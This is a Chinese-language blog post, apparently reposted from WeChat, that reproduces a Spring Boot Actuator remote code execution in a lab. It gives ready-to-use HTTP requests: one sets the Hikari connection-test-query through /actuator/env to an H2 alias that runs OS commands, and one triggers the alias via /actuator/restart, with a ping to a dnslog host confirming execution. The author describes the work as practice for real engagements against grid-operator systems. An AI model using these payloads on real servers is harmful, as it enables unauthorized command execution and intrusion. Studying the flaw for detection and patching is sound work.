> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZcuHN-nd2KXh6khoD7Z_HQ)

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHFbXPGAIpeV3dickFDRx7ez7KcMVHXEQR6pIZwEECu7trC9K6oGuMUuPQ/640?wx_fmt=png)

我的实战经验当中，南网的系统中遇到 Spring Boot 框架的概率最高。每次遇到 Spring Boot 框架的站点时，经常日不下来，不知道是不是自己的利用姿势有问题，所以还是搭建环境复现一下，以证明自己的姿势没问题。

在和各位前辈、师傅们探讨 Spring Boot 框架的渗透方式时，得来的一个比较有效的信息就是，Spring Boot 的 Xstream 反序列化漏洞出现的相对比较高频，而且也很好利用，危害性也高，后续会对此进行复现并记录。

复现环境搭建教程不赘述，已有师傅复现，如下

文章参考：https://www.o2oxy.cn/2656.html

项目地址：https://github.com/spaceraccoon/spring-boot-actuator-h2-rce

**0x01 漏洞描述**

Actuator 是 Spring Boot 提供的服务监控和管理中间件。当 Spring Boot 应用程序运行时，它会自动将多个端点注册到路由进程中。而由于对这些端点的错误配置，就有可能导致一些系统信息泄露、XXE、甚至是 RCE 等安全问题。

**0x02 影响版本**

// 默认未授权访问所有端点

Spring Boot < 1.5

// 默认只允许访问 / health 和 / info 端点，但是此安全性通常被应用程序开发人员禁用

Spring Boot >= 1.5

**0x03 漏洞利用**

开始之前，要思考一个问题，如何判断目标站点是否使用 Spring Boot 框架。Spring Boot 框架通常有两个特征点：

    1. 网站 ico 文件是一片绿叶

    2. 特有的报错信息 “Whitelabel Error Page”

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHFGeTRZdtLiaUx9Np6Yp6cQSSpnKGvDJuIOlNRxThHbMVHda2M0cicXLQw/640?wx_fmt=png)

这是官方文档对于每个端点的功能描述

<table><tbody><tr><td width="115.66666666666669" valign="top">路径<br></td><td width="419" valign="top">描述<br></td></tr><tr><td width="115.66666666666669" valign="top"><p>/autoconfig</p></td><td width="419" valign="top"><p>提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过</p></td></tr><tr><td width="115.66666666666669" valign="top"><p>/beans</p></td><td width="419" valign="top"><p>描述应用程序上下文里全部的 Bean，以及它们的关系</p></td></tr><tr><td width="115.66666666666669" valign="top"><p>/env</p></td><td width="419" valign="top"><p>获取全部环境属性</p></td></tr><tr><td width="115.66666666666669" valign="top"><p>/configprops</p></td><td width="419" valign="top"><p>描述配置属性 (包含默认值) 如何注入 Bean</p></td></tr><tr><td width="115.66666666666669" valign="top"><p>/dump</p></td><td width="419" valign="top"><p>获取线程活动的快照</p></td></tr><tr><td width="115.66666666666669" valign="top"><p>/health</p></td><td width="419" valign="top"><p>报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供</p></td></tr><tr><td width="115.66666666666669" valign="top"><p>/info</p></td><td width="419" valign="top"><p>获取应用程序的定制信息，这些信息由 info 打头的属性提供</p></td></tr><tr><td width="115.66666666666669" valign="top"><p>/mappings</p></td><td width="419" valign="top"><p>描述全部的 URI 路径，以及它们和控制器 (包含 Actuator 端点) 的映射关系</p></td></tr><tr><td width="115.66666666666669" valign="top"><p>/metrics‍</p></td><td width="419" valign="top"><p>报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数</p></td></tr><tr><td valign="top" colspan="1" rowspan="1"><p>/shutdown</p></td><td valign="top" colspan="1" rowspan="1"><p>关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true</p></td></tr><tr><td valign="top" colspan="1" rowspan="1"><p>/trace</p></td><td valign="top" colspan="1" rowspan="1"><p>提供基本的 HTTP 请求跟踪信息 (时间戳、HTTP 头等)</p></td></tr></tbody></table>

Spring Boot 1.x 版本的端口是在根 URL 下注册的，而 Spring Boot 2.x 版本的端口移至 / actuator 路径下，为此也专门特制了一份关于 Spring Boot 的目录字典。但是，在实战中遇到的情况却是端口路径可能存放于多级目录下，这就加大了利用的难度。

(1) 访问：http://192.168.100.133:8080/actuator

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHFoflJ9oHriajn5AhSdmLwNKHWz0oicg4alXL5E9LYmgHRic1Gwtl1UiavwA/640?wx_fmt=png)

<Chrome 浏览器视图 >

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHFKfKoHgUCAJo2Vf6cJfrhdeBenpNF58GZAeq0DsU1FNMtf5gzxgWLpw/640?wx_fmt=png)

<FireFox 浏览器视图 >

存在端点信息，接着发送如下 POST 包配置 spring.datasource.hikari.connection-test-query 的值。

```
POST /actuator/env HTTP/1.1
Host: 192.168.100.133:8080
Content-Type: application/json
Content-Length: 389

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}'; CALL EXEC('ping gkbtcq.dnslog.cn');"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHFAz0yEfxymlkUrYHHhqw7ovPicKIJNq86mIwPJBUKaR2txMe0YWttTbg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHFPnlLnFZaaZ5iaVrHVWq7PFgpAGqgicRuouXyWHF1iatAMRGnPgz45DCkw/640?wx_fmt=png)

发送完成后，查看 / actuator/env 信息

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHF5WC8B8qEdjTx5Q9ngfPl4FJX6zPkDlGNLM9PP0hb80stsqVEscQBKQ/640?wx_fmt=png)

再向端点 / actuator/restart 发送 POST 请求，Payload 如下：

```
POST /actuator/restart HTTP/1.1
Host: 192.168.100.133:8080
Content-Type: application/json
Content-Length: 356

{}
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHFNReP5hugFmKiaVWze8RE4PW9HDgEePmdkX3uz3B0hekxicftayVHibia9A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHFicYHBzfo6vGmAWuotMlg9e98FETYQ0QOuVoXyzw7BTUJjibTic98yZLJQ/640?wx_fmt=png)

重新启动成功，刷新 DNSLog 数据即可。  

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHF6SNAC2IRt38cQhjkH83KO0GFctZ4erWRwuuC6aJ1LaOW1KyNCfYhfQ/640?wx_fmt=png)